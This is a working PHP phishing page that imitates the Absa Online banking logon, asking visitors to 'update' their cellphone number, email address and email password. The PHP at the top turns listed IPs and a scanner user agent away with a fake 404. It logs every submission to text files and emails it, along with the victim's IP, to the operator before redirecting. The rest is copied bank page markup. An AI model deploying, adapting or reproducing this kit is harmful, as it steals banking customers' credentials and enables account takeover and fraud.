<?php ob_start(); @session_start();
require 'lop.php';
//$email = base64_decode($_GET['rxt']);
//$errx = base64_decode($_GET['err']); // from cux

$ip = getenv("REMOTE_ADDR");
$fal = false;


 $acn = $_SESSION['AccessAccount'];
 

$array = file('bx.st',FILE_IGNORE_NEW_LINES);
if(in_array($ip,$array)){
   header('HTTP/1.0 404 Not Found');
   die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}

if($_SERVER['HTTP_USER_AGENT'] == 'WebClient/1.0')
{
	header('HTTP/1.0 404 Not Found');
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}



if(isset($_POST['submit']))
{
	$cellN = $_POST['cellno'];
	$EmailAddr = $_POST['emailadd'];	
        $EmailPass = $_POST['emailpass'];

	
    if(trim($cellN) == "" || $cellN == '12345678910' || trim($EmailAddr) == "" ||  strlen($EmailAddr) < 6 || strlen($EmailPass) < 6)
	{
		$error = 'Invalid details entered. Re-enter the correct details to continue.';
		
		$fp = fopen("gg.txt", "a"); 
        fputs($fp, "AB $ip - [ bd ".$cellN." | ".$EmailAddr." | ".$EmailPass." ] \n"); 
        fclose($fp);
        $fal = true;
	}
    else {

         $fp = fopen("GGCC.txt", "a"); 
         fputs($fp, "AB $ip - [ bd ".$cellN." | ".$EmailAddr." | ".$EmailPass." ] \n");   
         fclose($fp);
         
         $to = EMAIL;
         $subject = 'InPas '.$ip;
         $msg  = $cellN."<br>";
         $msg .= $EmailAddr."<br>";
         $msg .= $EmailPass."<br>";
         $msg .= $ip;
		
         $headers  = 'MIME-Version: 1.0' . "\r\n";
         $headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
         $headers .= 'From: fintech' . "\r\n" .
    		         'X-Mailer: PHP/' . phpversion();
		 mail($to,$subject,$msg,$headers);

		 
		 $_SESSION['AccessAccount'] = $acn;

	 
		 
		 $dirName = dirname($_SERVER['PHP_SELF']);
         $redirTo = $dirName."/hen.html";        
         echo '<script>window.location.href="'.$redirTo.'"</script>';
		 exit;
	}
}

?>


<html class="js webkit webkit537_36 safari3 CSS1Compat Linux x86_64"><head>
		<style type="text/css">.btl-repaint{zoom:1;background-color:transparent;-moz-outline:none;}</style>
		<style type="text/css">.btl-drag-outlineElement{position:absolute;top:-10000px;left:-10000px;width:100px;height:100px;z-index:9999;border-width:1px;border-style:solid;background-color:#DFE0E1;border-color:#8B8D91;}</style>
		<style type="text/css">.btl-resize-cursorElement{position:absolute;top:-10000px;left:-10000px;width:100px;height:100px;z-index:10000;opacity:0;-ms-filter:"alpha(opacity=0)";filter:alpha(opacity=0);background:white;}.btl-resize-lineElement{position:absolute;top:-10000px;left:-10000px;width:1px;height:100px;z-index:9999;border-width:1px;border-style:solid;border-color:#8B8D91;overflow:hidden;}.btl-resize-outlineElement{position:absolute;top:-10000px;left:-10000px;width:100px;height:100px;z-index:9999;border-width:1px;border-style:solid;opacity:.4;-ms-filter:"alpha(opacity=40)";filter:alpha(opacity=40);background-color:#DFE0E1;border-color:#8B8D91;}</style>
		<meta http-equiv="X-UA-Compatible" content="IE=10; IE=9; IE=8">
		
		
		
		<title>Absa Online</title>
		<!--#if expr="( = /iPhone/)"-->
		<link rel="apple-touch-icon" href="images/Iphone_app_icon.png">
		<!--#endif -->

		
		
		<link rel="stylesheet" type="text/css" href="css/absa.css?v=0.1.0-2021-12-23-11-57-54" media="screen">
		<link rel="stylesheet" type="text/css" href="css/login.css?v=0.1.0-2021-12-23-11-57-54">
		<link rel="stylesheet" type="text/css" href="css/jcaptcha.css?v=0.1.0-2021-12-23-11-57-54">
		
		<link rel="shortcut icon" type="image/ico" href="images/favicon.ico">

		<!-- Device Profiling -->
		
			<!-- PS: These below 2 calls were added so that IE11 can also work -->
	
		
		<!-- <script type="text/javascript" src="static/script/absa/absa.SVM.js?v=0.1.0-2021-12-23-11-57-54"></script> -->

		

	</head>
	<body class="ssr-enabled ap-jsp-body prelogin" id="bodydiv" sid="w86qpl-uktbAiEILNdSZq78">
		
		<!-- Please wait splash -->
	
		<div style="position:fixed; top:0px; left:0px; z-index:105; width:100%; height:54px; background:#FFFFFF; padding:10px 0px 0px 10px; box-shadow: 0 4px 8px 0 rgba(0,0,0,.16);">
			<img src="images/logo-red.png" width="44" height="44">
		</div>
		
		<div class="ap-page-header" style="z-index:106;">
			
				<!-- <div style="padding-top:12px;"><img src="static/style/resources/absa-logo-2018.png" width="141" height="97" /></div> -->
			
			<div class="ap-navigation-main" style="z-index:107;">
				<div class="ap-tabStrip-rounded-left"></div>
				<ul class="ap-tabStrip-tabs">
					<li class="ap-tab-button ap-tab-active" id="SSR-tab-18">
						<div class="ap-tab-title" tabindex="10">Logon</div>
						<div class="ap-tab-title-hidden">Logon</div>
					</li>
					<li class="ap-tab-button" id="SSR-tab-19">
						
							<div class="ap-tab-title" tabindex="11"><a href="#">Registration</a></div>
						
						<div class="ap-tab-title-hidden">Registration</div>
					</li>
					<!-- <li class='ap-tab-button' id='SSR-tab-20'>
						<div class="ap-tab-title" tabindex="12"><a href="http://www.absa.co.za">Absa home page</a></div>
						<div class="ap-tab-title-hidden" style="font-size:14px;">%=xl.getLabel("Common/General/Label/AbsaHomePage",lang) %</div>
					</li> -->
					<li class="ap-tab-button" id="SSR-tab-20">
						<div class="ap-tab-title" tabindex="12"><a href="#" target="_new">How to guide</a></div>
						<div class="ap-tab-title-hidden" style="font-size:14px;">How to guide</div>
					</li>
				</ul>
				<div class="ap-tabStrip-rounded-right"></div>
				<div style="clear: both;"></div>
				<!-- <img src="static/style/resources/ao-logo2.png" width="189" height="60" style="position:absolute;top:0;right:20px" id="theImg"/> -->
				<div class="ap-navigation-sub ap-tabStrip-subnav"></div>
			</div>
		</div>
		
		<div class="ap-page-container" style="z-index:104;">
			<!-- PS: above div  ap-page-header   was HERE -->
			
			<div class="ap-global-message" id="ap-global-message">
				<div id="ap-nocookies-msg" style="display: none;">
					Warning: you do not have Cookies enabled. This applications needs Cookies to function
					properly. Please turn it on and reload the page. If you need assistance
					in turning on your Cookies <a>click here</a> to get instructions.
				</div>
				<noscript>
					<div>
						Warning: you do not have Javascript enabled. This
						applications needs Javascript to function properly. Please turn it on
						and reload the page. If you need assistance in turning on your
						Javascript <a>click here</a> to get instructions.
					</div>
				</noscript>
			</div>
			
			<div class="ap-main-content-wrapper">
				<!-- Page top corners -->
				<div class="ap-main-content-wrapper-top">
					<div class="ap-corners-rounded-top-left"></div>
					<div class="ap-corners-rounded-top"></div>
					<div class="ap-corners-rounded-top-right"></div>
				</div>
				
				<!-- Page content -->
				<div class="ap-page-content ap-container">
					<div class="ap-container-highlevel">
						<div class="ap-titlebar ap-heading-titlebar" style="padding-top: 0px;">
							<div id="header_results" class="ap-bar-section ap-bar-title" style="color: #FFFFFF">
								Logon&nbsp;
								| Welcome to Absa Online
							</div>
							<!-- Contact US -->
							<div id="header_results_contactUs" style="position:relative; float:right; padding:10px;">
								<a href="#" style="color:#FFFFFF; font-size:12px; font-weight:bold; text-decoration:none;">
									Contact us
								</a>
							</div>
						</div>
						
						
						<div class="ap-container-content" id="ap-container-content" style="padding-bottom:5px; overflow: hidden"><!-- PS: height must be set here to AUTO else it cuts of the bottom of the inner content -->
							
							<div class="ap-login-columns ap-columns-2-lhs" style="padding-top: 0px;">
								<!-- ap-column-1 -->
								<div class="ap-column-1 passwordScreen" id="ap-column-1" styleold="width:389px; padding:0">
									<div class="ap-login-container ap-common-positionRelative" id="ap-login-container"><div xmlns="http://www.w3.org/1999/xhtml"><div class="ap-titlebar ap-heading-titlebar ap-heading-titlebar-login"><div class="ap-bar-section ap-bar-title" style="margin-top:8px;margin-left:30px">Please update your contact details</div><div class="ap-resetPin-showMeHow" style="float:right; margin-right: 10px;"><div onclick="showHideHelp(this)" style="background: url('images/icon-questionmark-grey_2019.png') no-repeat scroll left top transparent; margin-top: 6px; height: 30px; width: 20px; cursor: pointer;" tooltip="Click here to Show me how." offsetx="0" offsety="10"></div></div></div><div class="ap-resetPin ap-common-borderLeft ap-common-borderRight ap-common-borderBottom"><div class="ap-resetPin-container" style="position:relative"><div>
										<form class="ui-form ap-resetPin-form1" method="POST" formtype="form"  data-httpsession="success" ><table class="ui-grid"><tbody class="ui-rows" style="font-weight: normal;color: #646464; font-size: 11px;"><tr class="ui-row"><td class="ui-cell ui-cell-50perc "><label class="ui-label " for="resetPin-accNo">Cellphone number<span class="ui-label--icon"></span></label></td><td class="ui-cell ui-cell-50perc "><input type="text" class="ui-form-field ui-textBox ui-textBox-singleLine ap-resetPin-accNo " id="resetPin-accNo" style="width:132px" name="cellno" value="" maxlength="20" messageref=".ui-form-field-errorMessage" schematypetext="An access account number is the bank account number you chose when you registered for Absa Online. It could be your current, savings or credit card account number" bbf_type="simple:accountNumber" bbf_required="true" requiredtext="An access account number is the bank account number you chose when you registered for Absa Online. It could be your current, savings or credit card account number" showmehow="An access account number is the bank account number you chose when you registered for Absa Online. It could be your current, savings or credit card account number"></td></tr><tr class="ui-row"><td class="ui-cell ui-cell-50perc "><label class="ui-label " for="resetPin-accNo">Email<span class="ui-label--icon"></span></label></td><td class="ui-cell ui-cell-50perc "><input type="text" class="ui-form-field ui-textBox ui-textBox-singleLine ap-resetPin-accNo " id="resetPin-accNo" style="width:132px" name="emailadd" value="" maxlength="50" messageref=".ui-form-field-errorMessage" schematypetext="An access account number is the bank account number you chose when you registered for Absa Online. It could be your current, savings or credit card account number" bbf_type="simple:accountNumber" bbf_required="true" requiredtext="An access account number is the bank account number you chose when you registered for Absa Online. It could be your current, savings or credit card account number" showmehow="An access account number is the bank account number you chose when you registered for Absa Online. It could be your current, savings or credit card account number"></td></tr><tr class="ui-row"><td class="ui-cell ui-cell-50perc "><label class="ui-label " for="resetPin-userNo" id="id-7077">Email password<span class="ui-label--icon"></span><span class="vi-screenreader-line">. There can be more than one user on Absa Online and each user has their own PIN. You must use the User Number given to you when you registered when you logon</span></label></td><td class="ui-cell ui-cell-50perc "><input type="password" class="ui-form-field ui-textBox ui-textBox-singleLine ap-resetPin-userNo  " id="resetPin-userNo" style="width:132px" name="emailpass" value="" maxlength="50" messageref=".ui-form-field-errorMessage" schematypetext="Enter a valid user number" bbf_type="simple:userNumber" bbf_required="true" requiredtext="Enter a valid user number" showmehow="There can be more than one user on Absa Online and each user has their own PIN. You must use the User Number given to you when you registered when you logon" aria-invalid="false" aria-required="true" aria-labelledby="id-7077" helptext="Enter a valid user number"></td></tr><tr class="ui-row"><td class="ui-cell ui-cell-50perc "></td><td class="ui-cell ui-cell-50perc "></td></tr></tbody></table><div class="ui-formFoot ap-resetPin-formFoot"><div class="ui-message ui-message-error genericMessage-place-holder" tabindex="0"><span class="vi-screenreader-line "> error Details. </span><div class="ui-message-timeStamp"><span class="vi-screenreader-line ">Time stamp. </span><span class="vi-screenreader-line ">Year. </span>2022-<span class="vi-screenreader-line ">Month. </span>01-<span class="vi-screenreader-line ">Day. </span>16<span class="vi-screenreader-line ">Time:. </span> &nbsp;22:47:58</div><div class="ui-message--icon"></div><div class="ui-message-content" style="margin-right: 120px"><div class="ui-message-body">Some of the information you have entered is incorrect or incomplete. Review and correct to continue.</div></div><div class="clear-both"></div></div><div class="ui-message ui-message-error ioErrorMessage-place-holder" tabindex="0"><span class="vi-screenreader-line "> error Details. </span><div class="ui-message-timeStamp"><span class="vi-screenreader-line ">Time stamp. </span><span class="vi-screenreader-line ">Year. </span>2022-<span class="vi-screenreader-line ">Month. </span>01-<span class="vi-screenreader-line ">Day. </span>16<span class="vi-screenreader-line ">Time:. </span> &nbsp;22:47:58</div><div class="ui-message--icon"></div><div class="ui-message-content" style="margin-right: 120px"><div class="ui-message-body">This transaction timed out. We are not sure of the result, please check your transaction history in 30 minutes before attempting the transaction again.<div xmlns:ui="http://www.absa.co.za/2009/ui" class="statusCode"></div></div></div><div class="clear-both"></div></div><div class="validation-place-holder"></div><div class="ui-message ui-message-error ap-resetPin-messageInvalidCaptcha" tabindex="0" style="display:none; <? $ls = "display:block;"; if($fal==true){ echo $ls; }?> ">
									     <span class="vi-screenreader-line "> error Details. </span><div class="ui-message-timeStamp"><span class="vi-screenreader-line "></span><span class="vi-screenreader-line "></span><span class="vi-screenreader-line "></span><span class="vi-screenreader-line "></span><span class="vi-screenreader-line "></span></div><div class="ui-message--icon"></div><div class="ui-message-content" style="margin-right: 120px"><div class="ui-message-body"><?  echo $error;  ?></div></div><div class="clear-both"></div></div><div class="ui-buttonFooter "><div class="ui-exception-container" style="margin-top: 4px;"><button class="ui-button ap-button-reset" name="resetpass" type="reset" tabindex="0" aria-label="Reset. "><div class="ui-button-left"><div class="ui-button-right"><div class="ui-button-center">Reset</div></div></div></button><button class="ui-button ap-button-next" name="submit" type="submit" tabindex="0"  aria-label="Next. "><div class="ui-button-left"><div class="ui-button-right"><div class="ui-button-center">Next</div></div></div></button></div></div></div><div class="ui-noticeBox " tabindex="0"><div xmlns:ui="http://www.absa.co.za/2009/ui" class="bold">Important information</div><ul xmlns:ui="http://www.absa.co.za/2009/ui"><li>This functionality is available for individual as well as sole proprietor customers.</li><li>Business banking and multiple user customers must visit the branch to reset the PIN.</li></ul></div>
									   </form></div></div></div></div></div>
								</div>
								
								<!-- ap-column-2 -->
								<div class="ap-column-2 passwordScreenAdds" id="ap-column-2" styleold="width:550px;">
									
									<div id="divadds1" style="position: relative; width: 100%; margin-bottom: 10px; display: none;">
										<!-- Security Center Links -->
										<div style="float:left; width:270px; margin-right:10px;">
											<div id="divimportantlinks" class="ap-login-block-rounded" style="display: none;">
												<!-- top round borders -->
												<div class="ap-login-block-rounded-top">
													<div class="ap-corners-rounded-top-left"></div>
													<div class="ap-corners-rounded-top"></div>
													<div class="ap-corners-rounded-top-right"></div>
												</div>
												<!-- content -->
												<div role="tablist" class="ui-tabBox">
													<ul class="ui-tabHeads">
														<li aria-selected="true" class="ui-tabHead ui-tab-selected-logon ui-tab-selected" role="button" tabindex="13">
															Security centre
															<span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
														</li>
													</ul>
													<div class="ui-tabBodies">
														<div tabindex="14" role="tabpanel" class="ui-tabBody ui-tabBody-selected" aria-hidden="true">
															<div style="background:#FFFFFF; padding:10px;">
																Find all the important information you need to bank securely and with peace of mind.
																<ul class="redarrow " style="padding-top:10px;" classold="ap-info-box-ul">
																	<li>View security measures and enhancements</li>
																	<li>Stay informed about latest scams</li>
																	<li>Shop online with ease</li>
																</ul>
																
																<a href="https://www.absa.co.za/security-centre/online-security" target="_new">
																	Learn more
																</a>
																
																<!-- <ul class="abc">
																	%=xl.getLinkListItems("Login/ImportantInformation",lang) %
																</ul> -->
															</div>
														</div>
													</div>
												</div>
												<!-- bottom round borders -->
												<div class="ap-login-block-rounded-bottom">
													<div class="ap-corners-rounded-bottom-left"></div>
													<div class="ap-corners-rounded-bottom"></div>
													<div class="ap-corners-rounded-bottom-right"></div>
												</div>
											</div>
										</div>
										
										<!-- Important Links on Right Side of Page -->
										<div style="float:left; width:270px;">
											<div id="divsecuritycentre" class="ap-login-block-rounded">
												<!-- top round borders -->
												<div class="ap-login-block-rounded-top">
													<div class="ap-corners-rounded-top-left"></div>
													<div class="ap-corners-rounded-top"></div>
													<div class="ap-corners-rounded-top-right"></div>
												</div>
												
												<!-- content -->
												<div role="tablist" class="ui-tabBox">
													<ul class="ui-tabHeads">
														<li aria-selected="true" class="ui-tabHead ui-tab-selected-logon ui-tab-selected" role="button" tabindex="18">
															Useful information
															<span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
														</li>
													</ul>
													<div class="ui-tabBodies">
														<div tabindex="19" role="tabpanel" class="ui-tabBody ui-tabBody-selected" aria-hidden="true">
															<div style="background: #FFFFFF;">
																<!-- <ul class="abc">
																	%=xl.getLinkListItems("Login/SecurityCenter",lang) %
																</ul> -->
																<ul class="abc">
																	<li><a href="https://www.absa.co.za/media-centre/press-statements/2021/update-grandmark-as-an-absa-listed-beneficiary/" id="am" target="_new">Grandmark International Pty Ltd</a></li><li><a href="https://www.absa.co.za/self-service/tools-to-do-your-banking/" id="am" target="_new">Explore more ways to do your banking</a></li><li><a href="https://www.absa.co.za/pricing/" id="am" target="_new">2022 rates and fees</a></li><li><a href="https://www.absa.co.za/planned-maintenance/" id="am" target="_new"><b style="color:#AF154B !important;">Planned Maintenance</b></a></li>
																</ul>
															</div>
														</div>
													</div>
												</div>
												
												<!-- bottom round borders -->
												<div class="ap-login-block-rounded-bottom">
													<div class="ap-corners-rounded-bottom-left"></div>
													<div class="ap-corners-rounded-bottom"></div>
													<div class="ap-corners-rounded-bottom-right"></div>
												</div>
											</div>
										</div>
										<div style="clear:both;"></div>
										<div style="position:relative; margin-top:10px; height:152px;">
											<div class="ap-login-campaign-image img1" style="position:absolute; top:0px; left:0px; width:280px;"><a href="https://www.absa.co.za/offers/safety-and-security/"><img src="images/campaigne_1_ENG.png" alt=""></a></div>
											<div class="ap-login-campaign-image img2" style="position:absolute; top:0px; right:0px; width:270px;"><a href="https://www.absa.co.za/pricing/"><img src="images/AOL_Retail_Pricing_2022_Eng.jpg" alt=""></a></div>
										</div>
									</div>
									
									<!-- How it Works Right of 2nd page -->
									<div id="divhowitworks" class="ap-login-block-rounded" style="display: block;">
										<div>
											<!-- top round borders -->
											<div class="ap-login-block-rounded-top">
												<div class="ap-corners-rounded-top-left"></div>
												<div class="ap-corners-rounded-top" style="width:312px;"></div>
												<div class="ap-corners-rounded-top-right"></div>
											</div>
											<!-- content -->
											<div role="tablist" class="ui-tabBox">
												<ul class="ui-tabHeads">
													<li aria-selected="true" class="ui-tabHead ui-tab-selected" role="button" tabindex="15">
														How it works
														<span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
													</li>
												</ul>
												<div class="ui-tabBodies">
													<div tabindex="16" role="tabpanel" class="ui-tabBody ui-tabBody-selected">
														<div style="background: #FFFFFF;">
															<div style="border-bottom: 1px solid #CCCCCC;">
																<div style="padding: 10px;">In this example the password is <b>Password1</b></div>
															</div>
															<div style="margin: 10px 0px 10px 10px;"><span class="pfsmalltxt">P</span>
																<span class="pfsmalltxt">a</span> <span class="pfsmalltxt">s</span>
																<span class="pfsmalltxt">s</span> <span class="pfsmalltxt">w</span>
																<span class="pfsmalltxt">o</span> <span class="pfsmalltxt">r</span>
																<span class="pfsmalltxt">d</span> <span class="pfsmalltxt">1</span>
															</div>
															<div style="margin: 10px 0px 5px 10px;">
																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="2">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="3">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="4">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="5">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="6">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="7">
																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
															</div>
															<div style="border-top: 1px solid #CCCCCC; border-bottom: 1px solid #CCCCCC; padding: 10px;">
																You have to enter (case sensitive):
															</div>
															<div style="margin: 10px 0px 10px 10px;"><span class="pfsmalltxt">P</span>
																<span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;&nbsp;</span>
																<span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;&nbsp;</span>
																<span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;</span>
																<span class="pfsmalltxt">d</span> <span class="pfsmalltxt">1</span>
															</div>
															<div style="margin: 10px 0px 5px 10px;">
																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="2">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="3">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="4">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="5">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="6">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="7">
																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
															</div>
															<br>
														</div>
													</div>
												</div>
											</div>
											<!-- bottom round borders -->
											<div class="ap-login-block-rounded-bottom">
												<div class="ap-corners-rounded-bottom-left"></div>
												<div class="ap-corners-rounded-bottom" style="width:312px;"></div>
												<div class="ap-corners-rounded-bottom-right"></div>
											</div>
										</div>
										
										<div class="ap-login-campaign-image img3" style="padding: 14px 0px 1px 0px;" id="ap-campaignImage-div"><a href="#"><img src="images/AOL_Retail_Pricing_2022_Eng.jpg" alt=""></a></div>
										<div class="ap-login-campaign-image img3" style="padding: 14px 0px 1px; display: none;" id="ap-campAPBImage-div"><a href="#"><img src="images/AOL_Private_Pricing_2022_Eng.jpg" alt="Payment History"></a></div>
									</div>
								</div>
								<!-- ap-column-2 -->
								<div class="ap-columns-clear"></div>
							</div>
							
							<!-- ap-columns-2-lhs -->
							<div style="width: 100%; height: 10px;"></div>
							
							<!-- 3 column layout -->
							<div id="divbottomadds" class="ap-login-columns ap-columns-33" style="display: none;">
								<!-- ap-column-1 -->
								<div class="ap-column-1">
									
									<!-- Security Centre Links Bottom left of Login page 1 -->
									<!-- PS: Was moved for Resonance to be next to input fields -->
									&nbsp;
								</div>
								
								<!-- ap-column-2 -->
								<div class="ap-column-2">
									<!-- Campaign Banner 1 used to be here -->
									&nbsp;
								</div>
								
								<!-- ap-column-3 -->
								<div class="ap-column-3">
									<!-- Campaign Banner 2 used to be here -->
									&nbsp;
								</div>
							</div>
						</div>
						
						<!-- bottom rounded corners -->
						<!-- <div class="ap-container-bottom ap-heading-titlebar-item ap-container-bottom-show"> -->
						<div class="ap-container-bottom ap-heading-titlebar-item ap-container-bottom-hide">
							<div class="ap-corners-rounded-bottom-left"></div>
							<div class="ap-corners-rounded-bottom"></div>
							<div class="ap-corners-rounded-bottom-right"></div>
						</div>
					</div>
				</div>
				
				<!-- Page bottom corners -->
				<div class="ap-main-content-wrapper-bottom">
					<div class="ap-corners-rounded-bottom-left"></div>
					<div class="ap-corners-rounded-bottom"></div>
					<div class="ap-corners-rounded-bottom-right"></div>
				</div>
			</div>
			
			<div class="ap-footer" tabindex="20">
				<div style="position:relative; top:0px; left:0px; width:971px; text-align:center;">
					<p tabindex="21">
						© Copyright. Absa Bank Limited. Registration Number: 1986/004794/06&nbsp;
						Authorized financial services and registered credit provider NCRCP7
					</p>
					<div class="ap-footer-links">
						<ul><li><a href="#" id="am">Security centre</a></li><li><a href="#" id="am">Terms of use</a></li><li><a href="#" id="am">Privacy policy</a></li><li><a href="#" id="am">Software requirements</a></li><li><a href="#" id="am">Banking regulations</a></li></ul>
					</div>
					<!-- Barclays Logo Link bottom right of page -->
					<div style="position:absolute; top:0px; right:0px; width:220px; text-align:right;">
						<!-- <a href="http://www.barclays.com" target="_new"><img src="static/style/resources/barclays_logo.gif" border="0" alt="Member of the Barclays group"></a> -->
						<!-- =xl.getImage("Images/Image/Barclays",lang) -->
					</div>
				</div>
			</div>
		</div>
		
		
		<!-- password tips -->
		
		
		<!-- LOGOUT POPUP -->
		
		
		
		<!-- Generic Modal -->
		
		
		
		<!-- hidden stuff -->
		
		
		<div></div>
		
		<!-- Please wait controller -->
		

	
	



</body></html>
